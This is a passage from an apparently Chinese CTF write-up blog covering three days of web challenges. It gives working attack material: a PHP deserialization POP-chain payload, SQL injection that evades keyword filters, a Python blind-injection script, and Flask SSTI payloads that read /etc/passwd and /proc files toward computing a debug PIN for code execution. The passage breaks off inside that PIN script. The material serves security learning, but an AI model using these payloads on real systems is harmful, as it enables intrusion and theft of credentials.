class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>update.php</code>得知，只要用admin登陆成功，即可获得flag。</p><p>核心代码在<code>lib.php</code>找反序列化点，在<code>User</code>类内：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br></pre></td></tr></table></figure><p>发现下面定义中，<code>$age</code>和<code>$nickname</code>是可控的，其将Info对象序列化后经过<code>safe()</code>函数处理返回给<code>update()</code>进行反序列化。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>跟进<code>safe函数</code>, 将很多SQL的关键字过滤，替换为<code>hacker</code>.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将关键字换成<code>hacker</code>, 导致长度发生变化（变长），可以进一步进行字符逃逸，然后注入对象。</p><p>在update.php内发现实例化了User并且调用了<code>User-&gt;update()</code>进行反序列化等操作，如果登录成功则输出flag：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进<code>User</code>对象，可以看到<code>__toString()</code>魔术方法：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>来到<code>UpdateHelper</code>类，发现会把sql给<code>echo()</code>出来：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果<code>$sql = new User()</code>的话，就会触发User内的<code>__toString()</code>魔术方法，该魔术方法内调用了<code>$nickname</code>属性的<code>update()</code>方法。虽然<code>dbCtrl</code>对象拥有<code>update()</code>方法，但真正是自己做的题的话就会发现，若<code>$nickname</code>实例化成个对象没意义，那个<code>update()</code>方法完全是障眼法，只能继续看。</p><p>可以发现Info类内有<code>__Call()</code>魔术方法，如果调用了一个不存在的属性，<code>__Call()</code>方法就会触发，正好Info类没有<code>update()</code>方法，如果User内的<code>$nickname</code>实例化为Info对象，调用不存在的<code>update()</code>就会触发这个<code>__Call()</code>，这个<code>__Call()</code>魔术方法将<code>Ctrlcase</code>的<code>login()</code>函数结果输出出来：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就很明显了，要把<code>$this-&gt;CtrlCase</code>实例化成<code>dbCtrl</code>对象，调用dbCtrl对象内的<code>login()</code>方法，跟进：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;token&#x27;</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br></pre></td></tr></table></figure><p>发现它正好把SQL的结果给返回了，这样整个pop链基本就理清楚了：</p><p>利用<code>UpdateHelper</code>的<code>__destruct</code>触发<code>User</code>的<code>__toString</code>然后走到<code>Info</code>的<code>__call</code>方法，在<code>__call</code>中调用了<code>dbCtrl</code>类的<code>login</code>方法，通过控制查询语句，把admin账户的密码查出来。</p><p>注意前面的内容中标注了有3个属性，为了保证属性一致，在payload前面加上CtrlCase的内容，然后在最后闭合语句，使<code>unserialize</code>忽略掉后面的<code>CtrlCase</code></p><p>还需要在<code>nickname</code>中插入足量的黑名单字符，把payload挤出去。</p><p>POC</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age= <span class="string">&#x27;select password,id from user where username=?&#x27;</span>; <span class="comment">//要把id放password后面</span></span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $token = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$v0w = <span class="keyword">new</span> UpdateHelper();</span><br><span class="line">$v0w-&gt;sql = <span class="keyword">new</span> User();</span><br><span class="line">$v0w-&gt;sql-&gt;nickname = <span class="keyword">new</span> Info();</span><br><span class="line">$v0w-&gt;sql-&gt;nickname-&gt;CtrlCase = <span class="keyword">new</span> dbCtrl();</span><br><span class="line"></span><br><span class="line">$v0w = <span class="string">&#x27;&quot;;s:8:&quot;CtrlCase&quot;;&#x27;</span> . serialize($v0w) . <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">$length = strlen($v0w);</span><br><span class="line">$v0w = str_repeat(<span class="string">&#x27;union&#x27;</span>, $length).$v0w;</span><br><span class="line"><span class="keyword">echo</span>($v0w);</span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后到网站的<code>update.php</code></p><p>POST: <code>age=1&amp;nickname=payload</code></p><p>得到admin密码的md5</p><p><img src="https://i.loli.net/2020/02/25/rdiGkDAlU82Y1FP.png"></p><p>解密后得到密码：<code>yingyingying</code>，登陆admin，得到flag</p><p><img src="https://i.loli.net/2020/02/25/gPY3R4H5ImdGsUZ.png"></p><h1 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="blacklist"><a href="#blacklist" class="headerlink" title="blacklist"></a>blacklist</h3><p>应该是一个<code>sqlshell</code>，进行<code>union select</code>时，给出<code>balcklist</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;</span>,$inject);</span><br></pre></td></tr></table></figure><p>想办法进行绕过。</p><p>查表</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;; show tables;#</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;FlagHere&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查字段</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;; show columns from FlagHere;#</span><br><span class="line"></span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MySQL有一个handler的可以代替select进行查询，payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;; handler FlagHere open as v; handler v read first; handler v close;#</span><br><span class="line"></span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(42) &quot;flag&#123;d9a362a0-3c8a-4f0e-b4fd-880287d5be73&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Ezsqli"><a href="#Ezsqli" class="headerlink" title="Ezsqli"></a>Ezsqli</h3><p>预备知识：</p><blockquote><p>对MYSQL注入相关内容及部分Trick的归类小结  <a href="https://xz.aliyun.com/t/7169#toc-50">https://xz.aliyun.com/t/7169#toc-50</a></p><p>聊一聊bypass information_schema  <a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a></p></blockquote><p>这个题看了P3rh4ps、rdd师傅的wp和微笑师傅的官方wp：</p><blockquote><p>P3: <a href="http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/">http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/</a></p><p>rdd: <a href="https://blog.csdn.net/qq_40648358/article/details/104456748">https://blog.csdn.net/qq_40648358/article/details/104456748</a></p><p>smi1e:<a href="https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/">https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/</a></p></blockquote><p>刚开始还好，fuzz发现：</p><ul><li>过滤了and or关键字</li><li>过滤了if</li><li>不能用information_schema</li><li>没有单独过滤union和select, 但是过滤了union select，union某某某select之类</li><li>过滤了sys.schema_auto_increment_columns </li><li>过滤了join</li></ul><p>fuzz还发现：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2</span><br><span class="line">返回Hello CQGAME</span><br><span class="line">2||1&#x3D;1</span><br><span class="line">返回Hello Nu1L</span><br><span class="line">2||1&#x3D;5</span><br><span class="line">返回Hello CQGAME</span><br></pre></td></tr></table></figure><p>也就是说，本来2查询的是CQGAME，如果<code>||</code>后面的表达式为True则返回Nu1L、false则返回CQGAME。继续测试：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2||substr((select 1),1,1)&#x3D;2</span><br><span class="line">Hello CQGAME</span><br><span class="line">2||substr((select 1),1,1)&#x3D;1</span><br><span class="line">Hello Nu1L</span><br></pre></td></tr></table></figure><p>说明可以布尔盲注。</p><p>这里抄了一下<a href="https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/">smi1e师傅的payload</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/index.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp1</span>():</span></span><br><span class="line">    str1 = (<span class="string">&#x27;0123456789&#x27;</span>+string.ascii_letters+string.punctuation).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    select = <span class="string">&#x27;select group_concat(table_name) from sys.x$schema_flattened_keys&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">            paylaod = <span class="string">&quot;1/**/&amp;&amp;/**/(select substr((&#123;&#125;),&#123;&#125;,1))=&#x27;&#123;&#125;&#x27;&quot;</span>.format(select, j, i)</span><br><span class="line">            <span class="comment">#print(paylaod)</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: paylaod,</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url,data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                flag += i</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp2</span>():</span></span><br><span class="line">    str1 = (<span class="string">&#x27;-0123456789&#x27;</span>+string.ascii_uppercase+string.ascii_lowercase+string.punctuation).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    flag_table_name = <span class="string">&#x27;f1ag_1s_h3r3_hhhhh&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">39</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">            i = flag+i</span><br><span class="line">            paylaod = <span class="string">&quot;1&amp;&amp;((select 1,concat(&#x27;&#123;&#125;~&#x27;,CAST(&#x27;0&#x27; as json))) &lt; (select * from &#123;&#125; limit 1))&quot;</span>.format(i,flag_table_name)</span><br><span class="line">            <span class="comment">#print(paylaod)</span></span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: paylaod,</span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                flag=i</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp1()</span><br><span class="line">    exp2()</span><br></pre></td></tr></table></figure><h1 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="Flaskapp"><a href="#Flaskapp" class="headerlink" title="Flaskapp"></a>Flaskapp</h3><p>进入网站y有两个功能：Base64编码，解码。在解码功能中，输入非法字符串，将会出现错误，可以进入debug模式。<br><img src="https://i.loli.net/2020/02/25/Co6Ls8Oqn3biYZR.png"></p><p>但是需要PIN码，这里涉及到一个知识<a href="https://xz.aliyun.com/t/2553">Flask debug pin安全问题</a></p><p>这个PIN码并不安全，如果可以得到一些信息，就可以计算出来。如果可以读取出这些信息，计算出PIN码，就可以进入debug模式，可以RCE解决问题。</p><p>测试发现解密处存在Flask的SSTI，可以利用SSTI进行任意文件读取（由于不知道flag位置和文件名，只能去读已知的文件）。<br>payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;想要读取的文件&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; </span><br></pre></td></tr></table></figure><p><strong>获取machine-id</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;proc&#x2F;self&#x2F;cgroup&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; </span><br><span class="line"></span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3Byb2Mvc2VsZi9jZ3JvdXAnLCAncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9IA&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">9:devices:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320</span><br></pre></td></tr></table></figure><blockquote><p>docker环境，读取/etc/machine-id 是错误的</p></blockquote><p><strong>获取MAC地址</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</span><br><span class="line">02:42:ac:12:00:06</span><br><span class="line"># 注意mac地址要转成十进制: 2485377957894</span><br></pre></td></tr></table></figure><p><strong>获取用户名</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">flaskweb:x:1000:1000::&#x2F;home&#x2F;flaskweb:</span><br></pre></td></tr></table></figure><p><strong>报错得到flask app的路径</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py</span><br></pre></td></tr></table></figure><p>通过大佬的脚本计算PIN码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#脚本出处：https://xz.aliyun.com/t/2553</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377957894&#x27;</span>,<span class="comment"># mac address,需要转成十进制</span></span><br><span class="line">    <span class="string">&#x27;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320&#x27;</span><span class="comment"># machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span 